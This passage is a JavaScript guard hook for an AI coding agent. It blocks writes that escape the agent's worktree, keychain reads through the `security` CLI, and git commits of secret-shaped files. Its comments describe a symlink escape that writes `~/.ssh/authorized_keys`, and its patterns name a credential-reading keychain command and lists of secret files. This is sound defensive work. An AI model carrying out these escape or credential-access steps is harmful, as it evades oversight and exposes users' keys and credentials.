// Claude Code PreToolUse guard: refuse any file-write whose resolved path escapes the agent's
// worktree. Invoked as `node worktree-guard.mjs <install-root>` with the tool payload on stdin.
//
// The <install-root> arg is only the worktree this hook was INSTALLED for; the SAME hook also runs
// for sub-agents / pooled worktrees whose real cwd is a DIFFERENT worktree. So the containment check
// is worktree-RELATIVE: it allows edits inside WHICHEVER worktree the caller is actually operating in
// (derived from the tool call's `cwd` via `git rev-parse --show-toplevel`), falling back to
// <install-root> when cwd isn't in a git work tree. Editing ANOTHER worktree is still blocked.
//
// NOTE: this is a best-effort guardrail, NOT a security sandbox. Its file-path containment check
// only inspects Edit/Write/MultiEdit/NotebookEdit paths — it does NOT otherwise constrain the Bash
// tool, which can write anywhere the user can. True isolation comes from the per-agent worktree+branch
// model; this hook just stops a well-behaved agent from accidentally editing outside its lane.
//
// It ALSO carries three narrow Bash guards:
//   - (sparkle-0ezz) it blocks a `security`-CLI invocation against the app's `ai.sparkle.desktop`
//     keychain item. Workers auto-approve their own shell commands, so an agent shelling out to
//     `security find-generic-password -s ai.sparkle.desktop` would pop a scary "security wants to use
//     your confidential information" OS prompt at the user. The app never shells out (it reads that
//     item in-process via keyring); only an agent does, so we stop the command from running.
//   - SECRET STAGING: it blocks a `git add` / `git commit` that would put a secret-shaped file into
//     git. Agents run with bypass-permissions and routinely type `git add -A && git commit`, so
//     nothing else stands between an untracked `.env.bak-<date>` holding a live API key and a public
//     GitHub repo. A `.gitignore` fix only ever helps the one repo somebody remembered to edit; this
//     guard ships with Sparkle and covers EVERY project a user points it at. (A repo-local
//     `pre-commit` hook is not an option: `core.hooksPath` is commonly set globally, which makes any
//     repo-local hook structurally unable to run. The PreToolUse hook is the layer that actually fires.)
//   - MERGE POLICY (contract §7): it blocks `gh pr merge` in a worktree whose
//     `.sparkle/merge-policy.json` says the repo is merge-protected. This one is deliberately
//     CONDITIONAL rather than a global deny rule: in the owner's OWN repo merging IS the sanctioned
//     path, so a static rule would rebuild the wall this posture exists to tear down. See the
//     MERGE-POLICY GUARD section for the three file states and why an ABSENT file must not block.
import { relative, sep, isAbsolute, dirname, join } from "node:path";
import { lstatSync, readFileSync, readlinkSync, statSync } from "node:fs";
import { homedir } from "node:os";
import { execFileSync } from "node:child_process";

// Canonicalize `p` by resolving symlinks one path segment at a time — a from-scratch realpath
// that also tolerates not-yet-existing trailing segments (the file a Write is about to create).
// This is the load-bearing part of the containment check: without full canonicalization an agent
// escapes its worktree by creating a symlink inside it that points outward (e.g. `ln -s ~/.ssh
// evil` then writing `<worktree>/evil/authorized_keys`).
//
// Why hand-rolled instead of fs.realpathSync: realpathSync throws on a DANGLING symlink (a link
// whose target doesn't exist yet — the `ln -s ~/.ssh/authorized_keys evil` injection), so it
// can't be used for a pre-write check. But getting this right is subtle; the walk MUST:
//   - resolve `..` against the *symlink-resolved* parent, never collapse it lexically up front
//     (path.resolve would turn `link/../x` into `x` before noticing `link` is a symlink), and
//   - re-walk EVERY segment of a symlink's target, including the target's own intermediate
//     symlinks (`a -> b/c`, `b -> /outside`), not just chain on the final component.
// So we process a growable segment QUEUE: a symlink's target is spliced back to the FRONT of the
// queue, so each of its components is itself re-checked for symlink-ness. A not-yet-existing
// component is accepted literally (a new file/dir). Returns null if a symlink loop blows the hop
// cap, so the caller fails closed.
function realResolve(p) {
  const startAbs = isAbsolute(p) ? p : `${process.cwd()}${sep}${p}`;
  const queue = startAbs.split(sep).filter((s) => s.length > 0);
  let resolved = sep; // POSIX filesystem root
  let hops = 0;
  while (queue.length > 0) {
    const seg = queue.shift();
    if (seg === ".") continue;
    if (seg === "..") {
      resolved = dirname(resolved); // pop against the RESOLVED parent, never lexically
      continue;
    }
    const next = resolved === sep ? sep + seg : `${resolved}${sep}${seg}`;
    let st;
    try {
      st = lstatSync(next);
    } catch {
      resolved = next; // doesn't exist yet — a new file/dir; accept literally
      continue;
    }
    if (!st.isSymbolicLink()) {
      resolved = next;
      continue;
    }
    // `hops` is a whole-path budget on TOTAL symlink resolutions (not a per-component chain
    // limit). Exceeding it — a cycle, or a pathological symlink farm — returns null → fail closed.
    if (++hops > 256) return null;
    let target;
    try {
      target = readlinkSync(next);
    } catch {
      // The link was deleted/replaced between the lstat above and here (a TOCTOU race). Don't
      // throw — that would escape to main() and (since only exit 2 blocks) fail OPEN; return
      // null so the caller fails closed instead.
      return null;
    }
    if (isAbsolute(target)) resolved = sep; // absolute target: restart from root
    // else the target is relative to the link's directory, which is the current `resolved`.
    queue.unshift(...target.split(sep).filter((s) => s.length > 0));
  }
  return resolved;
}

/** True iff `target` is `root` or a descendant of it, with BOTH sides canonicalized through
 *  symlinks (and `.`/`..`) so no symlinked or `..`-laden path component can escape the worktree.
 *  Fails closed (returns false) if either path can't be resolved (symlink loop). */
export function isInside(root, target) {
  const r = realResolve(root);
  // Join root+target WITHOUT lexical `..` collapse (realResolve handles `..` against resolved
  // parents); an absolute target is used as-is.
  const t = realResolve(isAbsolute(target) ? target : `${root}${sep}${target}`);
  if (r === null || t === null) return false;
  const rel = relative(r, t);
  return rel === "" || (!rel.startsWith("..") && !rel.startsWith(`..${sep}`));
}

/** True iff `command` (a Bash tool's command string) shells out to the macOS `security` CLI against
 *  the app's generic-password keychain item. We require ALL THREE signals so we block the confidential
 *  `ai.sparkle.desktop` access without snagging unrelated commands: (a) the `security` binary is invoked
 *  as a command word (bare or via an absolute path, not merely the substring "security" inside another
 *  word like "security-review"); (b) a `*-generic-password` subcommand; (c) the `ai.sparkle.desktop`
 *  service name. Apple's OS dialog can't be suppressed, so the goal is to stop the command from running. */
export function blocksKeychainCommand(command) {
  if (typeof command !== "string") return false;
  // (a) `security` invoked as a command word: at a start/separator boundary, optionally path-prefixed
  // (e.g. `/usr/bin/security`), followed by whitespace or end — so "insecurity"/"security-scan" miss.
  const invokesSecurity = /(^|[\s;&|()`'"])([^\s;&|()`'"]*\/)?security(\s|$)/.test(command);
  if (!invokesSecurity) return false;
  // (b) any *-generic-password subcommand (find/add/delete/set-generic-password).
  const genericPassword = /generic-password/.test(command);
  // (c) targeting the app's keychain service.
  const appService = /ai\.sparkle\.desktop/.test(command);
  return genericPassword && appService;
}

// ──────────────────────────────────────────────────────────────────────────────────────────────
// SECRET-STAGING GUARD
//
// Two DISTINCT cases, deliberately kept apart. Conflating them is what makes a secret scanner noisy
// enough to get ripped out, and a guard nobody trusts protects nothing:
//
//   CASE 1 — the command NAMES a secret-shaped path (`git add .env`, and notably the deliberate
//            override `git add -f .env`, which no .gitignore can stop). Evidence comes from the
//            command line itself, so this needs no repo access and is pure string matching.
//   CASE 2 — the command SWEEPS (`git add -A` / `--all` / `.` / a directory, `git commit -a`). The
//            command line names nothing, so the evidence has to come from the repository: ask
//            `git status --porcelain --untracked-files=all` and complain only about files that are
//            UNTRACKED AND NOT IGNORED. A properly gitignored `.env` is the correct, safe and
//            extremely common state; blocking on it would fire on nearly every repo and destroy
//            trust in the guard.
//
// FAIL-OPEN / FAIL-CLOSED ASYMMETRY — read this before "fixing" it into an outage:
//   * CASE 1 fails CLOSED. It needs nothing but the command string, so an inability to reach git is
//     not an inability to decide: the path is secret-shaped regardless, and we block. (The one repo
//     lookup it does make — "is this path already tracked?" — resolves to `false` when git cannot be
//     reached, i.e. toward blocking.)
//   * CASE 2 fails OPEN. Its whole premise is evidence FROM the repo, and absence of evidence is not
//     evidence: if `git status` cannot run (not a repo, git missing, no usable cwd, or the command
//     `cd`s somewhere first so the directory we would inspect is the WRONG one) then we have learned
//     nothing about whether a secret exists. Blocking there would break ordinary `git add -A` work
//     in every non-repo and every mis-detected directory, for zero security benefit — and a
//     wrong-directory inspection produces the worst outcome of all, a confident FALSE block naming a
//     file that has nothing to do with the command. So: cannot determine repo state → allow.
// The rest of this file fails CLOSED on unexpected errors (only exit 2 blocks, so a thrown error
// would otherwise let the tool call through); that discipline is preserved — the fail-open here is a
// deliberate, narrow decision about a KNOWN unknowable, not a swallowed exception.

/** Basenames that are secrets outright. */
const SECRET_BASENAMES = new Set([
  ".env",
  ".netrc",
  "_netrc",
  ".npmrc",
  ".pgpass",
  ".claude.json",
  ".credentials.json",
  "credentials.json",
  "auth.json",
  "accounts.json",
]);

/** Extensions that are private key / keystore material. */
const SECRET_EXTENSIONS = [".pem", ".key", ".p12", ".pfx", ".p8", ".keychain", ".keychain-db", ".jks", ".keystore"];

/** True iff `p` (a repo-relative or absolute path) looks like credential material. Basename-driven,
 *  with one path-anchored case (`.aws/credentials`). Covers the classes a `.gitignore` habitually
 *  misses — in particular `.env.<anything>` (the founder's `.env.bak-20260724`, which a bare `.env`
 *  literal does NOT match) and the suffix form (`production.env`, `deploy.env`).
 *
 *  Two exemptions keep the false-positive rate near zero, both of them files that are SUPPOSED to be
 *  committed: template files (`.env.example` / `.sample` / `.template` / `.dist` — this very repo
 *  tracks three `.env.example`s, so a false block here would be an immediate self-inflicted wound)
 *  and the `.pub` half of a keypair, which is public by definition. "Already tracked by git" is the
 *  third exemption and lives in the caller, since it needs the repo. */
export function isSecretPath(p) {
  if (typeof p !== "string" || p.length === 0) return false;
  const parts = p.replace(/\\/g, "/").split("/").filter((s) => s.length > 0);
  const base = (parts[parts.length - 1] ?? "").toLowerCase();
  if (base.length === 0) return false;
  // Exemption: the public half of a keypair, and anything shaped like a committed template.
  if (base.endsWith(".pub")) return false;
  if (/(^|\.)(example|sample|template|dist)$/.test(base)) return false;
  if (/^(example|sample|template)\./.test(base)) return false;
  if (SECRET_BASENAMES.has(base)) return true;
  if (SECRET_EXTENSIONS.some((ext) => base.endsWith(ext))) return true;
  // `.env.<anything>` (dotfile form) and `<anything>.env` (suffix form).
  if (base.startsWith(".env.") || base.endsWith(".env")) return true;
  // Private SSH keys, including suffixed variants like `id_ed25519_sparkle` (`.pub` already excluded).
  if (/^id_(rsa|dsa|ecdsa|ed25519)/.test(base)) return true;
  if (/^service-account.*\.json$/.test(base)) return true;
  // Path-anchored: `credentials` is only a secret when it sits directly under `.aws/`.
  if (base === "credentials" && parts[parts.length - 2] === ".aws") return true;
  return false;
}

/** Length of the unquoted REDIRECTION OPERATOR starting at `s[i]`, or 0 if there is none.
 *
 *  Covers every spelling Bash has: `>` `>>` `<` `<<` `<<<` `>|` `>&` `<&` `&>` `&>>`. The `&`
 *  forms have to be recognised HERE rather than left to the segment splitter, because a bare `&`
 *  is a command separator and `&>` is not one.
 *
 *  `<<` deliberately consumes only the heredoc's TERMINATOR word, never its body — the body is
 *  already removed upstream by `stripHeredocBodies`, which is what keeps `cat > note.txt <<'EOF'`
 *  … `EOF` from being read as commands. */
function redirectOperatorLength(s, i) {
  const c = s[i];
  if (c === ">") {
    const n = s[i + 1];
    return n === ">" || n === "|" || n === "&" ? 2 : 1;
  }
  if (c === "<") {
    if (s[i + 1] === "<") return s[i + 2] === "<" ? 3 : 2;
    return s[i + 1] === "&" ? 2 : 1;
  }
  if (c === "&" && s[i + 1] === ">") return s[i + 2] === ">" ? 3 : 2;
  return 0;
}

/** Lex a Bash command string into a list of SEGMENTS, each an array of word tokens, splitting on
 *  unquoted `;` `&&` `||` `|` `(` `)` and newlines. Quote- and backslash-aware so `git add "my
 *  dir/.env"` yields one path token and `echo 'git add -A'` yields no git segment at all. This is a
 *  guardrail's approximation of a shell, not a shell: exotica (command substitution, process
 *  substitution) simply degrades toward tokens we then fail to recognise as a git invocation, which
 *  is the safe direction for a check that must never fire spuriously.
 *
 *  REDIRECTIONS ARE RECOGNISED AND DROPPED, operator and target both, so the command keeps its true
 *  shape as ONE segment. This is not tidiness — leaving them in was a real fail-open. `>` and `<`
 *  are not word characters, so `git add -A > /dev/null` used to lex to
 *  `["git","add","-A",">","/dev/null"]`, and the two trailing tokens were then read as PATHSPECS:
 *  the CASE 2 secret sweep ran `git status --porcelain -uall -- '>' /dev/null`, git exited 128 with
 *  "is outside repository", the probe returned null, and the guard allowed a whole-repo add that
 *  would have staged an untracked `.env`. Four characters an agent types to silence a noisy command
 *  turned the guard off. Handled: `>` `>>` `<` `<<` `<<<` `>|` `>&` `<&` `&>` `&>>`, an optional
 *  leading file-descriptor digit (`2>`, `1>>` — the digit is dropped too, or it becomes a bogus
 *  pathspec in its own right), and both spaced (`> /dev/null`) and attached (`>/dev/null`) targets,
 *  including a quoted one (`> "my log.txt"`).
 *
 *  A `>` that is not an operator stays a literal character: inside quotes (`git commit -m "fix >
 *  bug"`) the quote branch has already claimed it, and backslash-escaped (`file\>name`) the escape
 *  branch runs FIRST and must keep doing so. */
function lexCommand(command) {
  const segments = [];
  let cur = [];
  let word = "";
  let hasWord = false;
  // Whether the pending word contains any QUOTED text. A file-descriptor prefix is bare digits by
  // definition, so `"2">file` is an ordinary word plus a redirect, not fd 2.
  let wordQuoted = false;
  let quote = null;
  const flushWord = () => {
    if (hasWord) {
      cur.push(word);
      word = "";
      hasWord = false;
      wordQuoted = false;
    }
  };
  const flushSegment = () => {
    flushWord();
    if (cur.length > 0) {
      segments.push(cur);
      cur = [];
    }
  };
  for (let i = 0; i < command.length; i++) {
    const c = command[i];
    if (quote !== null) {
      if (c === quote) {
        quote = null;
        continue;
      }
      if (quote === '"' && c === "\\" && i + 1 < command.length) {
        word += command[++i];
        continue;
      }
      word += c;
      continue;
    }
    if (c === "'" || c === '"') {
      quote = c;
      hasWord = true;
      wordQuoted = true;
      continue;
    }
    if (c === "\\" && i + 1 < command.length) {
      word += command[++i];
      hasWord = true;
      continue;
    }
    if (c === " " || c === "\t" || c === "\r") {
      flushWord();
      continue;
    }
    // A REDIRECTION — drop the operator and its target. Must come BEFORE the separator split,
    // because `&>` and `&>>` begin with the `&` that otherwise ends the segment.
    const opLen = redirectOperatorLength(command, i);
    if (opLen > 0) {
      // An optional file-descriptor prefix is part of the OPERATOR, not a word: `2>` must drop the
      // `2` as well, or it survives as a bogus `2` pathspec and errors git exactly as the target
      // would have. `&>` never carries one. Bare digits only, and never through quotes.
      if (c !== "&" && hasWord && !wordQuoted && /^[0-9]+$/.test(word)) {
        word = "";
        hasWord = false;
      }
      flushWord();
      // Consume the target word: optional whitespace, then one quote-and-backslash-aware word.
      let j = i + opLen;
      while (j < command.length && (command[j] === " " || command[j] === "\t")) j++;
      let tq = null;
      while (j < command.length) {
        const t = command[j];
        if (tq !== null) {
          if (t === tq) tq = null;
          else if (tq === '"' && t === "\\" && j + 1 < command.length) j++;
          j++;
          continue;
        }
        if (t === "'" || t === '"') {
          tq = t;
          j++;
          continue;
        }
        if (t === "\\" && j + 1 < command.length) {
          j += 2;
          continue;
        }
        // The target ends at whitespace, at a separator, or at the next redirection (`>a >b`).
        if (t === " " || t === "\t" || t === "\r" || t === "\n") break;
        if (t === ";" || t === "&" || t === "|" || t === "(" || t === ")") break;
        if (t === ">" || t === "<") break;
        j++;
      }
      i = j - 1; // the loop's own i++ lands on the first character after the target
      continue;
    }
    if (c === ";" || c === "\n" || c === "&" || c === "|" || c === "(" || c === ")") {
      flushSegment();
      continue;
    }
    word += c;
    hasWord = true;
  }
  flushSegment();
  return segments;
}

/** git's own global options that take a separate value word, so we can skip past them to the
 *  subcommand without mistaking the value for one. */
const GIT_GLOBAL_VALUE_OPTS = new Set(["-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env"]);

/** If `tokens` is a git invocation, return `{ sub, args, dirOverride }`; otherwise null. Leading
 *  `VAR=value` env assignments are skipped, and the binary may be path-prefixed (`/usr/bin/git`) —
 *  but a command merely NAMED like git (`gitk`, `legit`) is not one. */
function gitInvocation(tokens) {
  let i = 0;
  while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i])) i++;
  if (i >= tokens.length) return null;
  const bin = tokens[i].split("/").pop();
  if (bin !== "git") return null;
  i++;
  let dirOverride = null;
  while (i < tokens.length && tokens[i].startsWith("-")) {
    const t = tokens[i];
    if (GIT_GLOBAL_VALUE_OPTS.has(t)) {
      if (t === "-C") dirOverride = tokens[i + 1] ?? null;
      i += 2;
      continue;
    }
    if (t.startsWith("--git-dir=") || t.startsWith("--work-tree=")) {
      i++;
      continue;
    }
    i++;
  }
  if (i >= tokens.length) return null;
  return { sub: tokens[i], args: tokens.slice(i + 1), dirOverride };
}

/** Parse `git add` arguments into { paths, sweepsAll }. `sweepsAll` covers the forms that stage
 *  whatever happens to be lying around with no pathspec at all. `-u`/`--update` is deliberately NOT
 *  a sweep: it restages TRACKED modifications only and can never introduce an untracked file. */
function parseAddArgs(args) {
  const paths = [];
  let sweepsAll = false;
  let endOfOpts = false;
  for (let i = 0; i < args.length; i++) {
    const t = args[i];
    if (!endOfOpts && t === "--") {
      endOfOpts = true;
      continue;
    }
    if (!endOfOpts && t.startsWith("--")) {
      const name = t.split("=")[0];
      if (name === "--all" || name === "--no-ignore-removal") sweepsAll = true;
      // A pathspec list we cannot read — treat as a whole-repo sweep (CASE 2, which fails open).
      if (name === "--pathspec-from-file") {
        sweepsAll = true;
        if (!t.includes("=")) i++;
      }
      if (name === "--chmod" && !t.includes("=")) i++;
      continue;
    }
    if (!endOfOpts && t.startsWith("-") && t.length > 1) {
      if (t.slice(1).includes("A")) sweepsAll = true;
      continue;
    }
    paths.push(t);
  }
  return { paths, sweepsAll };
}

/** git-commit short options that consume a value: the rest of the cluster, or the next word. This is
 *  what keeps `-am "msg"` (= `-a -m msg`, a sweep) apart from `-ma` (= `-m a`, NOT a sweep) and stops
 *  a commit MESSAGE from ever being read as a pathspec. */
const COMMIT_SHORT_VALUE_OPTS = new Set(["m", "F", "c", "C", "t"]);
const COMMIT_LONG_VALUE_OPTS = new Set([
  "--message",
  "--file",
  "--reuse-message",
  "--reedit-message",
  "--author",
  "--date",
  "--cleanup",
  "--template",
  "--fixup",
  "--squash",
  "--pathspec-from-file",
  "--trailer",
]);

/** Every `git commit` option that makes the commit publish the WHOLE INDEX rather than just the named
 *  pathspecs. git's own mutual-exclusion message names exactly this family — "Only one of --include,
 *  --only, --all, --interactive, --patch can be used" — and `--only` is the one that CONFIRMS scoping
 *  (it is the default when pathspecs are given), so the other four are the ones we must catch. */
const COMMIT_INDEX_PUBLISHING_LONG = ["--all", "--include", "--interactive", "--patch"];
const COMMIT_INDEX_PUBLISHING_SHORT = new Set(["a", "i", "p"]);

/** `git commit` options that do NOT change which paths the commit publishes. This list exists to be
 *  INCOMPLETE safely: anything absent from it is treated as "we do not understand this command", and
 *  the index probe then runs UNSCOPED. See the `unknownOption` note on parseCommitArgs. */
const COMMIT_SCOPE_NEUTRAL_SHORT = new Set(["b", "e", "n", "o", "q", "s", "S", "u", "v", "z"]);
const COMMIT_SCOPE_NEUTRAL_LONG = new Set([
  "--message", "--file", "--reuse-message", "--reedit-message", "--author", "--date", "--cleanup",
  "--template", "--fixup", "--squash", "--trailer", "--amend", "--no-amend", "--edit", "--no-edit",
  "--verify", "--no-verify", "--signoff", "--no-signoff", "--gpg-sign", "--no-gpg-sign", "--quiet",
  "--verbose", "--dry-run", "--status", "--no-status", "--short", "--porcelain", "--long", "--null",
  "--branch", "--no-branch", "--reset-author", "--allow-empty", "--allow-empty-message", "--only",
  "--untracked-files", "--pathspec-file-nul", "--no-post-rewrite", "--author-date", "--squash-message",
]);

/** Parse `git commit` arguments into { paths, sweepsAll, includesIndex, unknownOption }.
 *
 *  The last three all answer ONE question: may the index probe be SCOPED to `paths`? Scoping is sound
 *  only for git's default `--only` behaviour — the commit contains those paths and nothing else, so an
 *  unrelated staged secret is not published by it. Anything that publishes the whole index breaks
 *  that, and getting it wrong is a SILENT ALLOW, the guard's worst failure mode.
 *
 *  So this asks a PROPERTY rather than testing membership against a fixed list of spellings, which is
 *  how the first version of this got it wrong (it enumerated `--include` and `-i` and missed `-p`,
 *  `--interactive`, and every abbreviation):
 *    - long options are matched by PREFIX, because git accepts any unambiguous abbreviation — `--inc`
 *      IS `--include`, and an equality test misses it;
 *    - `unknownOption` is the fail-closed backstop. An option we do not positively recognise as
 *      scope-neutral — a git flag added after this was written, an abbreviation we cannot resolve —
 *      forces the UNSCOPED probe. That errs toward a false block whose remedy (un-stage the secret)
 *      is sound advice whenever it fires, rather than toward silently publishing a credential. The
 *      neutral list above is therefore safe to be incomplete, and unsafe to "optimise" into a
 *      publishing-only check. */
function parseCommitArgs(args) {
  const paths = [];
  let sweepsAll = false;
  let includesIndex = false;
  let unknownOption = false;
  let endOfOpts = false;
  for (let i = 0; i < args.length; i++) {
    const t = args[i];
    if (!endOfOpts && t === "--") {
      endOfOpts = true;
      continue;
    }
    if (!endOfOpts && t.startsWith("--")) {
      const name = t.split("=")[0];
      // Prefix match: `name` is an abbreviation of a full option name iff the full name starts with it.
      const publishes = COMMIT_INDEX_PUBLISHING_LONG.filter((full) => full.startsWith(name));
      if (publishes.length > 0) {
        if (publishes.includes("--all")) sweepsAll = true;
        else includesIndex = true;
      } else if (name === "--pathspec-from-file") {
        sweepsAll = true;
      } else if (!COMMIT_SCOPE_NEUTRAL_LONG.has(name)) {
        unknownOption = true;
      }
      if (COMMIT_LONG_VALUE_OPTS.has(name) && !t.includes("=")) i++;
      continue;
    }
    if (!endOfOpts && t.startsWith("-") && t.length > 1) {
      for (let k = 1; k < t.length; k++) {
        const ch = t[k];
        if (COMMIT_SHORT_VALUE_OPTS.has(ch)) {
          // This option eats the remainder of the cluster, or the next word if it is the last char.
          if (k === t.length - 1) i++;
          break;
        }
        if (ch === "a") sweepsAll = true;
        else if (COMMIT_INDEX_PUBLISHING_SHORT.has(ch)) includesIndex = true;
        else if (!COMMIT_SCOPE_NEUTRAL_SHORT.has(ch)) unknownOption = true;
      }
      continue;
    }
    paths.push(t);
  }
  return { paths, sweepsAll, includesIndex, unknownOption };
}

/** Split git PATHSPEC MAGIC off a pathspec token: `{ path, excluded }`. Two things matter here.
 *  (a) A magic prefix is not part of the filename — `:(top).env` names `.env`, and matching the raw
 *  token would miss it. (b) An EXCLUDING pathspec (`:!*.env`, `:^secrets/`, `:(exclude)*.env`) names
 *  files the command is deliberately keeping OUT. Reading that as "the command explicitly names a
 *  secret" would false-block the very idiom a careful agent uses to avoid one — so `excluded` specs
 *  are dropped from our own analysis entirely. (They are still handed to git verbatim on the CASE 2
 *  probe, which is what makes `git add . ':!*.env'` correctly come back clean.) */
function parsePathspec(p) {
  if (typeof p !== "string" || p.length === 0) return { path: "", excluded: false };
  if (p.startsWith(":(")) {
    const end = p.indexOf(")");
    if (end === -1) return { path: p, excluded: false };
    const magic = p.slice(2, end).split(",").map((s) => s.trim());
    return { path: p.slice(end + 1), excluded: magic.includes("exclude") };
  }
  if (p.startsWith(":!") || p.startsWith(":^")) return { path: p.slice(2), excluded: true };
  if (p.startsWith(":/")) return { path: p.slice(2), excluded: false };
  return { path: p, excluded: false };
}

/** True iff pathspec `p` stages a whole subtree rather than one named file — `.`, `./`, `*`, `:/`, a
 *  trailing-slash path, or (when we have a directory to resolve against) any path that IS a
 *  directory. A subtree stage is a CASE 2 sweep scoped to that pathspec. */
function isDirectoryPathspec(p, dir) {
  if (p === "." || p === "./" || p === ".." || p === "*" || p === ":/" || p === ":/.") return true;
  if (p.endsWith("/")) return true;
  if (typeof dir !== "string" || dir.length === 0) return false;
  try {
    return statSync(isAbsolute(p) ? p : join(dir, p)).isDirectory();
  } catch {
    return false;
  }
}

/** Un-quote a path as `git status --porcelain` prints it. git C-quotes paths containing unusual
 *  bytes (`"src/caf\303\251.env"`); everything else is emitted verbatim. */
function unquoteStatusPath(p) {
  if (!(p.startsWith('"') && p.endsWith('"') && p.length >= 2)) return p;
  try {
    // JSON's escape grammar covers the common cases (\" \\ \n \t); octal escapes are left alone,
    // which at worst yields a slightly odd-looking filename in the refusal message.
    return JSON.parse(p);
  } catch {
    return p.slice(1, -1);
  }
}

/** Drop pathspecs that PROVABLY cannot name a file in this repo, returning the rest.
 *
 *  DEFENCE IN DEPTH, for the class of bug the redirect fix removed one instance of. `git status`
 *  fails the WHOLE invocation when any single pathspec is unsatisfiable — `/dev/null` exits 128
 *  with "is outside repository" — and both probes below read that as "repo state undeterminable"
 *  and fail OPEN. So one stray spec silently takes the entire sweep judgement down with it. A spec
 *  that cannot match anything here contributes no coverage, so dropping it loses nothing and stops
 *  it from nulling the specs that DO.
 *
 *  Three deliberate limits, each one a false-refusal or lost-coverage bug avoided:
 *
 *  - THE BOUNDARY IS THE REPO ROOT, NOT `dir`. From a subdirectory, `git add ../src/` is an
 *    ordinary in-repo command; judging it against `dir` would drop it and lose real coverage. The
 *    root costs one `rev-parse`, and only when a spec actually looks suspicious — the overwhelmingly
 *    common case (plain relative paths) never pays for it.
 *  - MAGIC PATHSPECS ARE NEVER JUDGED. `:!x`, `:(top)y`, `:/` are git syntax, not filesystem paths,
 *    and second-guessing them here could drop an exclusion the agent deliberately wrote.
 *  - IF THE ROOT CANNOT BE READ, NOTHING IS DROPPED. Proving a spec is out of repo requires knowing
 *    where the repo is; without that the existing behaviour (hand it all to git, fail open if git
 *    objects) is unchanged.
 *
 *  Returns `null` for "nothing this command names can be in this repo" — the caller then reports NO
 *  HITS rather than probing. Callers must never treat that as an unscoped probe: widening a scoped
 *  add into a whole-repo sweep would block on an unrelated `.env` and be a false refusal with no
 *  approval path.
 *
 *  Two composition traps, each of which flips this filter into the very bug it closes:
 *
 *  - AN EXCLUSION-ONLY SURVIVOR IS NOT A SCOPE. Magic is always kept and out-of-repo positives are
 *    dropped, so `git add ../sibling/ ':!*.log'` can leave `[":!*.log"]` behind — and git reads an
 *    all-negative pathspec list as if `.` had also been given, silently making the probe the whole
 *    repo. Counting survivors cannot see this; only a POSITIVE survivor counts. (An add that names
 *    no positive spec to begin with is git's own "everything except" form, and scoping the probe
 *    the way git scopes the command is correct — so the check keys on losing the positives, not on
 *    their absence.)
 *  - BOTH SIDES MUST BE CANONICALISED. `rev-parse --show-toplevel` reports the PHYSICAL path (git
 *    derives it from `getcwd()`), while `dir` and an absolute spec arrive verbatim — and on macOS
 *    `/tmp` is a symlink to `/private/tmp`. Compared unresolved, every in-repo spec looks like it
 *    escapes, `.` itself is dropped, and the probe reports "clean" having never run. That is worse
 *    than the documented fail-open: it is a positive claim of safety. Anything that cannot be
 *    resolved KEEPS the spec — this filter may never drop on a guess. */
function inRepoPathspecs(dir, pathspecs) {
  const judgeable = (p) => !p.startsWith(":"); // magic is git syntax, never a filesystem path
  const isPositive = (p) => !parsePathspec(p).excluded;
  const suspicious = (p) => isAbsolute(p) || /(^|\/)\.\.(\/|$)/.test(p);
  if (!pathspecs.some((p) => judgeable(p) && suspicious(p))) return pathspecs;
  const root = gitToplevel(dir);
  if (root === null) return pathspecs; // cannot prove anything → change nothing
  const rootReal = realResolve(root);
  const dirReal = realResolve(dir);
  if (rootReal === null || dirReal === null) return pathspecs;
  const kept = pathspecs.filter((p) => {
    if (!judgeable(p)) return true;
    const abs = realResolve(isAbsolute(p) ? p : `${dirReal}${sep}${p}`);
    if (abs === null) return true; // unresolvable → keep; never drop on a guess
    const rel = relative(rootReal, abs);
    return rel === "" || (!rel.startsWith(`..${sep}`) && rel !== ".." && !isAbsolute(rel));
  });
  if (pathspecs.some(isPositive) && !kept.some(isPositive)) return null;
  return kept;
}

/** Secret-shaped files that are UNTRACKED AND NOT IGNORED in `dir`, optionally scoped to
 *  `pathspecs`. Returns [] when the repo is clean of them, or null when the repo state could not be
 *  determined at all — the caller treats null as "allow" (see the fail-open note above).
 *
 *  `--untracked-files=all` is load-bearing: the default `normal` mode collapses an untracked
 *  directory to a single `dir/` entry, which would hide every secret inside it. Ignored files are
 *  simply absent from the output (we do NOT pass `--ignored`), which is exactly the semantics we
 *  want: a gitignored `.env` is safe and must never trigger this. */
function untrackedSecrets(dir, pathspecs) {
  if (typeof dir !== "string" || dir.length === 0) return null;
  const args = ["-C", dir, "status", "--porcelain", "--untracked-files=all"];
  if (pathspecs.length > 0) {
    const scoped = inRepoPathspecs(dir, pathspecs);
    // Nothing this command names can be in here — no hits, and deliberately NOT an unscoped probe
    // (that would be a false refusal; see inRepoPathspecs).
    if (scoped === null || scoped.length === 0) return [];
    args.push("--", ...scoped);
  }
  let out;
  try {
    out = execFileSync("git", args, {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "ignore"],
      timeout: 5000, // a PreToolUse hook must never hang the agent; a timeout throws → fail open
      maxBuffer: 16 * 1024 * 1024,
    });
  } catch {
    return null; // not a repo / git missing / timed out / output too large → cannot determine
  }
  const hits = [];
  for (const line of out.split("\n")) {
    if (!line.startsWith("?? ")) continue; // `??` is untracked-and-not-ignored, the only class we judge
    const p = unquoteStatusPath(line.slice(3).trim());
    if (isSecretPath(p)) hits.push(p);
  }
  return hits;
}

/** Secret-shaped files that are already IN THE INDEX at `dir`, i.e. staged for the next commit.
 *  Returns [] when there are none, or null when repo state could not be determined (fail open).
 *
 *  Why this exists on top of the untracked probe: a `git commit -m "…"` names nothing and sweeps
 *  nothing, yet it publishes whatever the index already holds — staged by something this hook could
 *  not see. A repo script the agent invokes (`bash scripts/deploy.sh`, which runs `git add -A`
 *  internally) is opaque to our lexer; so is a `bash -c "git add -A"`; so is anything staged before
 *  this guard shipped. Without this, the commit half of the guard is unenforced on the single most
 *  common command an agent types.
 *
 *  Only index codes `A`/`R`/`C` count — a path NEWLY introduced to the index. A tracked file's
 *  modification (`M`) is already in history, so blocking it protects nothing and would just fire on
 *  ordinary edits to legitimately committed files. `--untracked-files=no` keeps this probe cheap:
 *  it runs on every `git commit`, and the working-tree scan is not needed to read the index.
 *
 *  SCOPED to the commit's own pathspecs when it has any: `git commit -m "fix" src/app.ts` commits
 *  ONLY that path, so an unrelated staged secret elsewhere is not published by it and complaining
 *  would be a false block whose message ("this commit would publish them") is simply untrue. Raw
 *  pathspecs go to git verbatim, so magic and exclusions stay honoured. */
